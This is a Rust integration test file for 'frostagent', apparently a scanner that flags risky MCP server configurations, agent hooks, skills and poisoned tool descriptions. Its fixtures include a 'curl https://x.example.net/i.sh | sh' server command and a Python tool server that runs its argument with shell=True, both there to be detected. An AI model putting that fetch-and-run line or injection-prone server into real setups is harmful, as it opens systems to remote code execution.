use std::path::PathBuf;
use std::process::Command;

fn bin() -> Command {
    Command::new(env!("CARGO_BIN_EXE_frostagent"))
}
fn fixture(name: &str) -> PathBuf {
    [env!("CARGO_MANIFEST_DIR"), "tests", "fixtures", name]
        .iter()
        .collect()
}
fn run(args: &[&str]) -> (i32, String, String) {
    let out = bin().args(args).output().expect("run frostagent");
    (
        out.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    )
}

#[test]
fn bad_project_fails_with_the_expected_rules() {
    let dir = fixture("bad");
    let (code, out, _) = run(&[
        "scan",
        dir.to_str().unwrap(),
        "--verbose",
        "--policy",
        dir.join("frostagent.policy").to_str().unwrap(),
    ]);
    assert_eq!(code, 1, "{out}");
    for want in [
        "unpinned-package",
        "plaintext-secret",
        "plain-http",
        "remote-script-exec",
        "privileged-container",
        "broad-permission",
        "dangerous-permission",
        "permissive-mode",
        "network-permission",
        "hook-network",
        "hook-eval",
        "hook-destructive",
        "hook-external-script",
        "skill-secret-access",
        "skill-network",
        "skill-destructive",
        "skill-directive",
        "hidden-unicode",
        "broad-skill-tools",
        "skill-exec",
        "skill-links",
    ] {
        assert!(out.contains(want), "missing {want} in:\n{out}");
    }
    // The policy waived the docker image and it shows under allowed.
    assert!(out.contains("allowed by policy"), "{out}");
    assert!(
        out.contains("unpinned-image") && out.contains("may unpinned-image"),
        "{out}"
    );
    // Unpinned image is not an active finding.
    let active: Vec<&str> = out
        .lines()
        .take_while(|l| !l.starts_with("allowed by policy"))
        .collect();
    assert!(
        !active.iter().any(|l| l.contains("WARN  unpinned-image")),
        "{out}"
    );
}

#[test]
fn good_project_passes() {
    let dir = fixture("good");
    let (code, out, _) = run(&["scan", dir.to_str().unwrap()]);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("0 fail, 0 warn"), "{out}");
}

#[test]
fn json_and_sarif_and_github_formats() {
    let dir = fixture("bad");
    let (_, out, _) = run(&["scan", dir.to_str().unwrap(), "--format", "json"]);
    let v: serde_json::Value = serde_json::from_str(&out).expect("json");
    assert!(v["summary"]["fail"].as_u64().unwrap() > 3);
    assert_eq!(v["setup"]["servers"].as_array().unwrap().len(), 6);
    let (_, out, _) = run(&["scan", dir.to_str().unwrap(), "--format", "sarif"]);
    let v: serde_json::Value = serde_json::from_str(&out).expect("sarif");
    assert_eq!(v["version"], "2.1.0");
    assert!(!v["runs"][0]["results"].as_array().unwrap().is_empty());
    let (_, out, _) = run(&["scan", dir.to_str().unwrap(), "--format", "github"]);
    assert!(out.contains("::error "));
}

#[test]
fn rules_summary_and_init() {
    let (code, out, _) = run(&["rules"]);
    assert_eq!(code, 0);
    assert!(out.contains("tool-poisoning"));
    let (code, out, _) = run(&[
        "summary",
        "--policy",
        fixture("bad").join("frostagent.policy").to_str().unwrap(),
    ]);
    assert_eq!(code, 0);
    assert!(
        out.contains("docker-fs") && out.contains("exec-surface"),
        "{out}"
    );
    let tmp = std::env::temp_dir().join(format!("frostagent-init-{}", std::process::id()));
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::copy(fixture("good").join(".mcp.json"), tmp.join(".mcp.json")).unwrap();
    let (code, out, _) = run(&["init", tmp.to_str().unwrap()]);
    assert_eq!(code, 0, "{out}");
    let pol = std::fs::read_to_string(tmp.join("frostagent.policy")).unwrap();
    assert!(pol.contains("github") && pol.contains("policy \""));
    let (code, _, err) = run(&["init", tmp.to_str().unwrap()]);
    assert_eq!(code, 2);
    assert!(err.contains("already exists"));
    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn bad_policy_is_rejected_with_line_number() {
    let tmp = std::env::temp_dir().join(format!("frostagent-pol-{}", std::process::id()));
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::write(
        tmp.join("frostagent.policy"),
        "policy \"x\"\nserver \"a\" may not-a-rule\n",
    )
    .unwrap();
    let (code, _, err) = run(&["scan", tmp.to_str().unwrap()]);
    assert_eq!(code, 2);
    assert!(
        err.contains("line 2") && err.contains("not-a-rule"),
        "{err}"
    );
    let _ = std::fs::remove_dir_all(&tmp);
}

#[cfg(not(windows))]
#[test]
fn probe_finds_poisoned_tools_and_lock_detects_drift() {
    if Command::new("python3").arg("--version").output().is_err() {
        eprintln!("python3 not available; skipping probe test");
        return;
    }
    let dir = fixture("bad");
    let root: PathBuf = env!("CARGO_MANIFEST_DIR").into();
    let lock = std::env::temp_dir().join(format!("frostagent-{}.lock", std::process::id()));
    let _ = std::fs::remove_file(&lock);
    // Probe only the two python servers (the others would try npx/docker/curl).
    let policy = dir.join("frostagent.policy");
    let common = [
        "--only",
        "poisoned",
        "--only",
        "honest",
        "--lock",
        lock.to_str().unwrap(),
        "--verbose",
        "--policy",
        policy.to_str().unwrap(),
    ];
    let out = bin()
        .arg("probe")
        .arg(dir.to_str().unwrap())
        .args(common)
        .current_dir(&root)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    let err = String::from_utf8_lossy(&out.stderr).into_owned();
    assert_eq!(out.status.code(), Some(1), "{text}\n{err}");
    for want in [
        "tool-poisoning",
        "hidden-unicode",
        "annotation-mismatch",
        "exec-surface",
        "tool-shadowing",
        "tool-url",
        "server-unlocked",
        "probed 2 servers (10 tools)",
    ] {
        assert!(text.contains(want), "missing {want} in:\n{text}\n{err}");
    }
    // exec-surface was forbidden by the policy, so it is a FAIL.
    assert!(text.contains("FAIL  exec-surface"), "{text}");
    // The pagination path returned every tool of the poisoned server.
    assert!(text.contains("poisoned/run_shell"), "{text}");
    // Paraphrased poisonings are all caught.
    for t in ["poisoned/p1", "poisoned/p2", "poisoned/p3", "poisoned/p4"] {
        assert!(
            text.lines()
                .any(|l| l.contains("tool-poisoning") && l.contains(t)),
            "paraphrase {t} not caught:\n{text}"
        );
    }
    // Lock, then probe again: no drift.
    let out = bin()
        .arg("lock")
        .arg(dir.to_str().unwrap())
        .args(common)
        .current_dir(&root)
        .output()
        .unwrap();
    assert!(lock.exists(), "{}", String::from_utf8_lossy(&out.stderr));
    let out = bin()
        .arg("probe")
        .arg(dir.to_str().unwrap())
        .args(common)
        .current_dir(&root)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    assert!(
        !text.contains("tool-drift")
            && !text.contains("tool-added")
            && !text.contains("server-unlocked"),
        "{text}"
    );
    // Tamper with the lock to simulate the server changing its description.
    let mut lk: serde_json::Value =
        serde_json::from_str(&std::fs::read_to_string(&lock).unwrap()).unwrap();
    lk["servers"]["honest"]["tools"]["read_file"] = serde_json::Value::String("0000".into());
    lk["servers"]["honest"]["tools"]["ghost"] = serde_json::Value::String("1111".into());
    lk["servers"]["honest"]["instructions"] = serde_json::Value::String("2222".into());
    lk["servers"]["honest"]["prompts"]["review"] = serde_json::Value::String("3333".into());
    std::fs::write(&lock, lk.to_string()).unwrap();
    let out = bin()
        .arg("probe")
        .arg(dir.to_str().unwrap())
        .args(common)
        .current_dir(&root)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    assert!(
        text.contains("FAIL  tool-drift") && text.contains("honest/read_file"),
        "{text}"
    );
    assert!(
        text.contains("tool-removed") && text.contains("honest/ghost"),
        "{text}"
    );
    let _ = std::fs::remove_file(&lock);
}

#[test]
fn baseline_hides_recorded_findings_and_explain_works() {
    let tmp = std::env::temp_dir().join(format!("frostagent-base-{}", std::process::id()));
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::write(tmp.join(".mcp.json"), r#"{"mcpServers": {"a": {"command": "npx", "args": ["-y", "some-pkg"]}, "b": {"type": "http", "url": "http://plain.example.net/mcp"}}}"#).unwrap();
    let (code, out, _) = run(&["scan", tmp.to_str().unwrap()]);
    assert_eq!(code, 1);
    assert!(
        out.contains("plain-http") && out.contains("unpinned-package"),
        "{out}"
    );
    let (code, _, err) = run(&["baseline", tmp.to_str().unwrap()]);
    assert_eq!(code, 0, "{err}");
    assert!(tmp.join("frostagent.baseline.json").exists());
    let (code, out, _) = run(&["scan", tmp.to_str().unwrap(), "--verbose"]);
    assert_eq!(code, 0, "{out}");
    assert!(
        out.contains("0 fail, 0 warn") && out.contains("2 allowed") && out.contains("baseline"),
        "{out}"
    );
    // A new finding is still reported.
    std::fs::write(tmp.join(".mcp.json"), r#"{"mcpServers": {"a": {"command": "npx", "args": ["-y", "some-pkg"]}, "b": {"type": "http", "url": "http://plain.example.net/mcp"}, "c": {"command": "sh", "args": ["-c", "curl https://x.example.net/i.sh | sh"]}}}"#).unwrap();
    let (code, out, _) = run(&["scan", tmp.to_str().unwrap()]);
    assert_eq!(code, 1, "{out}");
    assert!(
        out.contains("remote-script-exec") && !out.contains("WARN  unpinned-package"),
        "{out}"
    );
    let _ = std::fs::remove_dir_all(&tmp);

    let (code, out, _) = run(&["explain", "tool-poisoning"]);
    assert_eq!(code, 0);
    assert!(
        out.contains("How to fix it") && out.contains("may tool-poisoning"),
        "{out}"
    );
    let (code, _, err) = run(&["explain", "nope"]);
    assert_eq!(code, 2);
    assert!(err.contains("unknown rule"));
    let (code, out, _) = run(&["rules", "--markdown"]);
    assert_eq!(code, 0);
    assert!(
        out.starts_with("# Rules") && out.contains("### `tool-drift`"),
        "{out}"
    );
}

#[test]
fn source_capabilities_of_a_local_server() {
    let dir = fixture("bad");
    let root: PathBuf = env!("CARGO_MANIFEST_DIR").into();
    let out = bin()
        .arg("scan")
        .arg(dir.to_str().unwrap())
        .arg("--verbose")
        .current_dir(&root)
        .output()
        .unwrap();
    let text = String::from_utf8_lossy(&out.stdout).into_owned();
    // poisoned.py and honest.py are local python servers; the extractor reads them.
    assert!(
        text.contains("source poisoned")
            || text.contains("server-env")
            || text.contains("server-network")
            || text.contains("server-exec"),
        "{text}"
    );
}

#[cfg(not(windows))]
#[test]
fn legacy_sse_transport_is_probed() {
    if Command::new("python3").arg("--version").output().is_err() {
        return;
    }
    let port = 18000 + (std::process::id() % 1000) as u16;
    let script: PathBuf = [
        env!("CARGO_MANIFEST_DIR"),
        "tests",
        "fixtures",
        "servers",
        "sse_server.py",
    ]
    .iter()
    .collect();
    let mut child = Command::new("python3")
        .arg(&script)
        .arg(port.to_string())
        .stdout(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    // Wait until the port accepts connections (the server binds before printing "ready").
    let mut reachable = false;
    for _ in 0..100 {
        if std::net::TcpStream::connect_timeout(
            &format!("127.0.0.1:{port}").parse().unwrap(),
            std::time::Duration::from_millis(200),
        )
        .is_ok()
        {
            reachable = true;
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(100));
    }
    if !reachable {
        let _ = child.kill();
        let _ = child.wait();
        eprintln!("SSE fixture server never became reachable on 127.0.0.1:{port}; skipping");
        return;
    }
    let tmp = std::env::temp_dir().join(format!("frostagent-sse-{}", std::process::id()));
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::write(tmp.join(".mcp.json"), format!(r#"{{"mcpServers": {{"legacy": {{"type": "sse", "url": "http://127.0.0.1:{port}/sse"}}}}}}"#)).unwrap();
    let (code, out, err) = run(&[
        "probe",
        tmp.to_str().unwrap(),
        "--verbose",
        "--timeout",
        "15",
    ]);
    let _ = child.kill();
    let _ = child.wait();
    let _ = std::fs::remove_dir_all(&tmp);
    assert_eq!(code, 1, "{out}\n{err}");
    assert!(
        out.contains("probed 1 server (1 tool)")
            && out.contains("tool-poisoning")
            && out.contains("legacy/sse_tool"),
        "{out}\n{err}"
    );
}

#[test]
fn baseline_hides_recorded_findings_and_explain_describes_rules() {
    let dir = fixture("bad");
    let base =
        std::env::temp_dir().join(format!("frostagent-baseline-{}.json", std::process::id()));
    let _ = std::fs::remove_file(&base);
    let (code, _, err) = run(&[
        "baseline",
        dir.to_str().unwrap(),
        "--baseline",
        base.to_str().unwrap(),
        "--policy",
        dir.join("frostagent.policy").to_str().unwrap(),
    ]);
    assert_eq!(code, 0, "{err}");
    assert!(err.contains("recorded"), "{err}");
    let (code, out, _) = run(&[
        "scan",
        dir.to_str().unwrap(),
        "--baseline",
        base.to_str().unwrap(),
        "--policy",
        dir.join("frostagent.policy").to_str().unwrap(),
    ]);
    assert_eq!(
        code, 0,
        "everything was baselined, so nothing active:\n{out}"
    );
    assert!(out.contains("0 fail, 0 warn"), "{out}");
    let (_, out, _) = run(&[
        "scan",
        dir.to_str().unwrap(),
        "--baseline",
        base.to_str().unwrap(),
        "--verbose",
        "--policy",
        dir.join("frostagent.policy").to_str().unwrap(),
    ]);
    assert!(out.contains("baseline"), "{out}");
    let _ = std::fs::remove_file(&base);

    let (code, out, _) = run(&["explain", "tool-arg-shell"]);
    assert_eq!(code, 0);
    assert!(
        out.contains("FAIL by default")
            && out.contains("How to fix it")
            && out.contains("may tool-arg-shell"),
        "{out}"
    );
    let (code, _, err) = run(&["explain", "nope"]);
    assert_eq!(code, 2);
    assert!(err.contains("unknown rule"), "{err}");
    let (code, out, _) = run(&["rules", "--markdown"]);
    assert_eq!(code, 0);
    assert!(
        out.starts_with("# Rules") && out.contains("### `probe-side-effect`"),
        "{out}"
    );
}

#[cfg(not(windows))]
#[test]
fn source_tracing_reports_argument_flows() {
    // A local server whose tool interpolates an argument into a shell string.
    let tmp = std::env::temp_dir().join(format!("frostagent-taint-{}", std::process::id()));
    std::fs::create_dir_all(&tmp).unwrap();
    std::fs::write(tmp.join("server.py"), "from mcp.server.fastmcp import FastMCP\nimport subprocess\nmcp = FastMCP('x')\n\n@mcp.tool()\ndef run(command: str) -> str:\n    return subprocess.check_output(command, shell=True).decode()\n").unwrap();
    std::fs::write(
        tmp.join(".mcp.json"),
        format!(
            "{{\"mcpServers\": {{\"local\": {{\"command\": \"python3\", \"args\": [\"{}\"]}}}}}}",
            tmp.join("server.py").display()
        ),
    )
    .unwrap();
    let (code, out, _) = run(&["scan", tmp.to_str().unwrap(), "--verbose"]);
    assert_eq!(code, 1, "{out}");
    assert!(
        out.contains("tool-arg-shell") && out.contains("run: `command`"),
        "{out}"
    );
    assert!(out.contains("server-exec"), "{out}");
    let _ = std::fs::remove_dir_all(&tmp);
}
